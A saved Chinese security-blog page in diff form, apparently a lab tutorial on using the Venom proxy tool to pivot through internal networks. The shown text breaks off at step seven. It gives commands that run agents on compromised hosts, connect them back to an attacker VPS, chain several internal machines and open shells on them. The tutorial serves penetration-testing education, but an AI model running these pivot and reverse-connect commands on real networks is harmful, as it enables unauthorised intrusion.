@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000">
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top">
+  
+  
+  <title>内网渗透-边界穿透神器（Venom） | VK&#39;Blog|博客</title>
+  <meta name="description" content="0x01 Venom使用 0x02 实战环境准备 0x03 构建多级代理 0x04 向节点上传/从节点下载文件 0x05 建立到某节点的socks5代理 0x06 将本地端口转发到远程/将远程端口转发到本地 0x07 流量加密传输 0x08 参考资料    0x01 Venom使用 步骤一：下载Venom（毒液）  https://github.com/Dliv3/Venom/release">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-边界穿透神器（Venom）">
+<meta property="og:url" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/index.html">
+<meta property="og:site_name" content="VK&#39;s blog">
+<meta property="og:description" content="0x01 Venom使用 0x02 实战环境准备 0x03 构建多级代理 0x04 向节点上传/从节点下载文件 0x05 建立到某节点的socks5代理 0x06 将本地端口转发到远程/将远程端口转发到本地 0x07 流量加密传输 0x08 参考资料    0x01 Venom使用 步骤一：下载Venom（毒液）  https://github.com/Dliv3/Venom/release">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882266246049.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882268531494.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882279227934.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882282467250.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882318884309.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882320094391.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882320967162.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882321380748.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882321798388.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882322010895.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882322302396.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882322776545.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882323370853.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882323752275.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882323960434.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882324159602.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882324573234.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882325126648.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882325665062.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882325749470.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882328904539.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882329209511.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882329468536.jpg">
+<meta property="og:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882329831610.jpg">
+<meta property="og:updated_time" content="2020-05-18T05:36:19.424Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网渗透-边界穿透神器（Venom）">
+<meta name="twitter:description" content="0x01 Venom使用 0x02 实战环境准备 0x03 构建多级代理 0x04 向节点上传/从节点下载文件 0x05 建立到某节点的socks5代理 0x06 将本地端口转发到远程/将远程端口转发到本地 0x07 流量加密传输 0x08 参考资料    0x01 Venom使用 步骤一：下载Venom（毒液）  https://github.com/Dliv3/Venom/release">
+<meta name="twitter:image" content="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/15882266246049.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/index.html">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">VK</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">VK&#39;Blog</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="http://www.vkxss.top" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APP/">APP</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2016/">CVE-2016</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2017/">CVE-2017</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE-2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2019/">CVE-2019</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a><span class="category-list-count">23</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a><span class="category-list-count">24</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网/">内网</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端安全/">前端安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP渗透测试/">APP渗透测试</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2016–3714/">CVE-2016–3714</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2017-11882/">CVE-2017-11882</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2018-1273/">CVE-2018-1273</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-0708/">CVE-2019-0708</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-16278/">CVE-2019-16278</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-16759/">CVE-2019-16759</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java代码审计/">Java代码审计</a><span class="tag-list-count">20</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux本地提取/">Linux本地提取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB渗透测试/">WEB渗透测试</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全-CSRF/">前端安全-CSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端知识/">前端知识</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/加解密集合/">加解密集合</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反弹Shell/">反弹Shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小程序/">小程序</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/应急响应/">应急响应</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/APP渗透测试/" style="font-size: 13.57px;">APP渗透测试</a> <a href="/tags/CVE-2016–3714/" style="font-size: 13px;">CVE-2016–3714</a> <a href="/tags/CVE-2017-11882/" style="font-size: 13px;">CVE-2017-11882</a> <a href="/tags/CVE-2018-1273/" style="font-size: 13px;">CVE-2018-1273</a> <a href="/tags/CVE-2019-0708/" style="font-size: 13px;">CVE-2019-0708</a> <a href="/tags/CVE-2019-16278/" style="font-size: 13px;">CVE-2019-16278</a> <a href="/tags/CVE-2019-16759/" style="font-size: 13.14px;">CVE-2019-16759</a> <a href="/tags/Java代码审计/" style="font-size: 13.86px;">Java代码审计</a> <a href="/tags/Linux本地提取/" style="font-size: 13px;">Linux本地提取</a> <a href="/tags/WEB渗透测试/" style="font-size: 14px;">WEB渗透测试</a> <a href="/tags/内网渗透/" style="font-size: 13.71px;">内网渗透</a> <a href="/tags/前端安全-CSRF/" style="font-size: 13px;">前端安全-CSRF</a> <a href="/tags/前端知识/" style="font-size: 13.43px;">前端知识</a> <a href="/tags/加解密集合/" style="font-size: 13px;">加解密集合</a> <a href="/tags/反弹Shell/" style="font-size: 13px;">反弹Shell</a> <a href="/tags/基础知识/" style="font-size: 13.29px;">基础知识</a> <a href="/tags/小程序/" style="font-size: 13.14px;">小程序</a> <a href="/tags/应急响应/" style="font-size: 13px;">应急响应</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/前端安全/">前端安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/19/前端安全-突破前端js加密/" class="title">前端安全-突破前端js加密</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-19T05:06:50.000Z" itemprop="datePublished">2020-05-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WEB安全/">WEB安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/18/小程序-获取小程序源码(支付宝)/" class="title">小程序-获取小程序源码（Alipay）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-18T08:58:37.000Z" itemprop="datePublished">2020-05-18</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WEB安全/">WEB安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/18/小程序-获取小程序源码(微信)/" class="title">小程序-获取小程序源码（Wechat）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-18T08:58:37.000Z" itemprop="datePublished">2020-05-18</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WEB安全/">WEB安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/13/渗透测试-XSS姿势小集/" class="title">渗透测试-XSS姿势小集</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-13T03:38:45.000Z" itemprop="datePublished">2020-05-13</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/内网/">内网</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/05/03/内网渗透-信息搜集-windows篇/" class="title">内网渗透-信息搜集-windows篇</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-02T17:14:22.000Z" itemprop="datePublished">2020-05-03</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-内网渗透-Venom内网工具使用实战" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      内网渗透-边界穿透神器（Venom）
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/04/30/内网渗透-Venom内网工具使用实战/" class="article-date">
+	  <time datetime="2020-04-30T06:22:05.000Z" itemprop="datePublished">2020-04-30</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/内网/">内网</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/内网渗透/">内网渗透</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/04/30/内网渗透-Venom内网工具使用实战/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.7k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 7(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <!-- toc -->
+
+<ul>
+<li><a href="#0x01-venom使用">0x01 Venom使用</a></li>
+<li><a href="#0x02-实战环境准备">0x02 实战环境准备</a></li>
+<li><a href="#0x03-构建多级代理">0x03 构建多级代理</a></li>
+<li><a href="#0x04-向节点上传从节点下载文件">0x04 向节点上传/从节点下载文件</a></li>
+<li><a href="#0x05-建立到某节点的socks5代理">0x05 建立到某节点的socks5代理</a></li>
+<li><a href="#0x06-将本地端口转发到远程将远程端口转发到本地">0x06 将本地端口转发到远程/将远程端口转发到本地</a></li>
+<li><a href="#0x07-流量加密传输">0x07 流量加密传输</a></li>
+<li><a href="#0x08-参考资料">0x08 参考资料</a></li>
+</ul>
+<!-- tocstop -->
+
+<h3><span id="0x01-venom使用">0x01 Venom使用</span></h3><ul>
+<li><p>步骤一：下载Venom（毒液）</p>
+<ul>
+<li><p><a href="https://github.com/Dliv3/Venom/releases" target="_blank" rel="noopener">https://github.com/Dliv3/Venom/releases</a></p>
+<p><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882266246049.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>如何使用官方介绍的很详细，简单介绍下。Venom；这是一款为渗透测试人员设计的使用Go开发的多级代理工具。Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点</p>
+</li>
+<li><p>步骤二：解压打开后的目录结构：<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882268531494.jpg" alt></p>
+</li>
+</ul>
+<h3><span id="0x02-实战环境准备">0x02 实战环境准备</span></h3><ul>
+<li><p><strong>外网vps + 靶标</strong></p>
+<ul>
+<li><p><strong>场景一</strong>：vps_windows + 靶标_window</p>
+<p>  admin节点和agent节点均可监听连接也可发起连接</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin监听端口，agent发起连接:</span><br><span class="line">vps:admin.exe -lport 9999</span><br><span class="line">靶标:agent.exe -rhost 192.168.0.103 -rport 9999</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">agent监听端口，admin发起连接:</span><br><span class="line">vps:agent.exe -lport 8888</span><br><span class="line">靶标:admin.exe -rhost 192.168.204.139 -rport 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>场景二</strong>：vps_Linux + 靶标_靶标Linux</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin监听端口，agent发起连接:</span><br><span class="line">vps:./admin_linux_x64 -lport 4343</span><br><span class="line">靶标:./agent_linux_x64 -rhost vps_ip -rport 4343</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">agent监听端口，admin发起连接:</span><br><span class="line">vps:./agent_linux_x64 -lport 4343</span><br><span class="line">靶标:./admin_linux_x64 -rhost vps_ip -rport 4343</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>场景三</strong>：vps_Windows + 靶标_靶标Linux</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin监听端口，agent发起连接:</span><br><span class="line">vps:admin.exe -lport 9999</span><br><span class="line">靶标:./agent_linux_x64 -rhost 118.89.224.245 -rport 9999</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h3><span id="0x03-构建多级代理">0x03 构建多级代理</span></h3><ul>
+<li><p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882279227934.jpg" alt></p>
+</li>
+<li><p><strong>场景一</strong>：</p>
+<ul>
+<li><p>1、外网的vps，Ubuntu：120.10.120.X（反正就是一个外网的IP）</p>
+</li>
+<li><p>2、内网的机器三台windowsIP地址192.168.3.160、192.168.3.15、192.168.3.30</p>
+</li>
+<li><p>3、设想外网的VPS要访问最里面的3.160只能一层一层的依次访问；3.160只能和3.30相互访问；3.30可以和3.15，3.160访问而不能访问外网的VPS；最后3.15能被外网VPS访问，也能和3.30相互访问；这时我们就是用神器Venom来进行一层一层的代理；（大家都知道同一个局域网的都可以相互访问，但是这只是设想了一个场景便于理解使用）</p>
+<p><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882282467250.jpg" alt></p>
+</li>
+<li><p><strong>步骤一</strong>：</p>
+<ul>
+<li>1、将文件agent_linux_x64传到沦陷主机A,并对对应的执行文件进行修改权限 chmod 777 admin_linux_x64<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882318884309.jpg" alt></li>
+</ul>
+</li>
+<li><p><strong>步骤二</strong>：</p>
+<ul>
+<li>vps执行命令./admin_linux_x64 -lport 4343，监听本地4343端口<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882320094391.jpg" alt></li>
+</ul>
+</li>
+<li><p><strong>步骤三</strong>：</p>
+<ul>
+<li><p>这里所有内网window机器都已经上传了Venom工具包并解压；接下来在192.168.3.15机器上面执行连接操作；执行命令agent.exe -rhost 120.10.120.X -rport 4343；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882320967162.jpg" alt></p>
+</li>
+<li><p>很快外网的VPS也监听成功了，获取了；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882321380748.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p><strong>步骤四</strong>：</p>
+<ul>
+<li><p>然后来在外网的VPS上进行操作；help，这里我们要使用到show，goto，listen，exit，shell这几个命令；先来看看怎么使用，余下的命令自己都可以摸索出来的；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882321798388.jpg" alt></p>
+</li>
+<li><p>这里执行show命令，可以看见刚刚进行连接的一个节点；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882322010895.jpg" alt></p>
+</li>
+<li><p>好勒，再来试试goto命令 这样可以切换到1节点上面去；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882322302396.jpg" alt></p>
+<ul>
+<li>嘿，还是很简单的，接下里看看是否真的切换到192.168.3.15机器上面了，执行shell；就是192.168.3.15；这说明成功了；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882322776545.jpg" alt></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>步骤五</strong></p>
+<ul>
+<li>接下来exit退出，进行下一步的监听操作；在不退出1节点的基础上面执行listen 4343端口进行监听；192.168.3.15机器上面已经监听成功了；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882323370853.jpg" alt></li>
+</ul>
+</li>
+<li><p><strong>步骤六</strong></p>
+<ul>
+<li><p>接着在192.168.3.30机器上面执行连接操作，执行命令：agent.exe -rhost 192.168.3.15 -rport 4343，执行成功了；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882323752275.jpg" alt></p>
+</li>
+<li><p>再回到VPS上面进行查看一下，执行show命令，是否新增了一个节点；新增了一个节点；Venom工具在执行过程中尽量不要将命令写错，这个没有办法删除错误的命令 ；只能enter了<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882323960434.jpg" alt></p>
+</li>
+<li><p>切换到节点2中；执行命令：goto 2；切换成功了后ipconfig查看IP，192.168.3.30这就是了，没有问题了；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882324159602.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p><strong>步骤七</strong></p>
+<ul>
